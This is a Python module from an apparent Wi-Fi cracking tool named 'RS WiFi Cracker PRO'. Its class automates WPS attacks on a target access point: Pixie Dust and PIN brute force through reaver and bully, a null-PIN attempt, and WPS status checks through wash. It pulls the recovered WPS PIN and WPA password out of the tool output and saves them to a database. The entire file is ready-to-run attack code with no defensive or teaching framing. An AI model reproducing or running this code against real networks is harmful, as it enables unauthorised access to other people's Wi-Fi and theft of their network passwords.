#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - WPS Attack Module"""
import re
import time
import subprocess
from typing import Optional, Tuple
from datetime import datetime


class WPSAttack:
    """WPS attack module (Pixie Dust, Brute Force)"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.wps_locked_count = 0
    
    def pixie_dust(self, bssid: str, timeout: int = 300) -> Optional[Tuple[str, str]]:
        """WPS Pixie Dust attack"""
        self.logger.info(f"Pixie Dust attack on {bssid}...")
        
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-vv', '-K', '1', '-N'
            ], capture_output=True, text=True, timeout=timeout)
            
            stdout = result.stdout
            
            # Check for locked
            if 'WPS lock' in stdout or 'locked' in stdout.lower():
                self.logger.warning("WPS is locked!")
                self.wps_locked_count += 1
                return None
            
            # Extract PIN
            pin_match = re.search(r"WPS PIN:\s*[\'\"]?(\d{8})[\'\"]?", stdout)
            if pin_match:
                pin = pin_match.group(1)
                self.logger.success(f"WPS PIN: {pin}")
                
                # Get password
                password = self._get_password(bssid, pin)
                if password:
                    self.logger.success(f"Password: {password}")
                    if self.db:
                        self.db.update_handshake_cracked(bssid, password)
                    return (pin, password)
                
                return (pin, None)
            
            if 'failed' in stdout.lower():
                self.logger.warning("Pixie Dust not vulnerable")
                
        except subprocess.TimeoutExpired:
            self.logger.warning("Pixie Dust timeout")
        except FileNotFoundError:
            self.logger.error("Reaver not installed")
        except Exception as e:
            self.logger.error(f"Pixie Dust failed: {e}")
        
        return None
    
    def _get_password(self, bssid: str, pin: str) -> Optional[str]:
        """Get password using WPS PIN"""
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-p', pin, '-vv'
            ], capture_output=True, text=True, timeout=120)
            
            pwd_match = re.search(r'WPA PSK:\s*[\'\"](.+?)[\'\"]', result.stdout)
            if pwd_match:
                return pwd_match.group(1)
                
        except Exception as e:
            self.logger.debug(f"Password retrieval failed: {e}")
        
        return None
    
    def brute_force(self, bssid: str, timeout: int = 3600, 
                    start_pin: str = None) -> Optional[str]:
        """WPS brute force attack using bully"""
        self.logger.info(f"WPS brute force on {bssid}...")
        
        cmd = ['bully', '-b', bssid, self.interface, '-v', '3']
        if start_pin:
            cmd.extend(['-s', start_pin])
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            
            # Check results
            if 'PIN:' in result.stdout:
                match = re.search(r'PIN:\s*(\d{8})', result.stdout)
                if match:
                    pin = match.group(1)
                    self.logger.success(f"WPS PIN: {pin}")
                    return pin
            
            if 'locked' in result.stdout.lower():
                self.logger.warning("WPS locked")
                
        except subprocess.TimeoutExpired:
            self.logger.warning("Brute force timeout")
        except FileNotFoundError:
            self.logger.error("Bully not installed")
        except Exception as e:
            self.logger.error(f"Brute force failed: {e}")
        
        return None
    
    def reaver_brute(self, bssid: str, timeout: int = 3600) -> Optional[str]:
        """WPS brute force using reaver"""
        self.logger.info(f"Reaver brute force on {bssid}...")
        
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-vv', '-S', '-d', '1', '-T', '0.5'
            ], capture_output=True, text=True, timeout=timeout)
            
            pin_match = re.search(r"WPS PIN:\s*[\'\"]?(\d{8})[\'\"]?", result.stdout)
            if pin_match:
                return pin_match.group(1)
                
        except Exception as e:
            self.logger.error(f"Reaver brute failed: {e}")
        
        return None
    
    def check_wps_status(self, bssid: str) -> dict:
        """Check WPS status of AP"""
        status = {
            'enabled': False,
            'locked': False,
            'version': None,
            'vulnerable_pixie_dust': False
        }
        
        try:
            # Use wash to check
            result = subprocess.run([
                'wash', '-i', self.interface, '-b', bssid
            ], capture_output=True, text=True, timeout=30)
            
            if bssid.lower() in result.stdout.lower():
                status['enabled'] = True
            
            if 'locked' in result.stdout.lower():
                status['locked'] = True
                
        except Exception as e:
            self.logger.debug(f"WPS check failed: {e}")
        
        return status
    
    def null_pin_attack(self, bssid: str) -> bool:
        """Try null PIN attack"""
        self.logger.info(f"Trying null PIN attack on {bssid}...")
        
        try:
            result = subprocess.run([
                'reaver', '-i', self.interface, '-b', bssid,
                '-p', '00000000', '-vv'
            ], capture_output=True, text=True, timeout=60)
            
            if 'WPA PSK' in result.stdout:
                return True
                
        except:
            pass
        
        return False
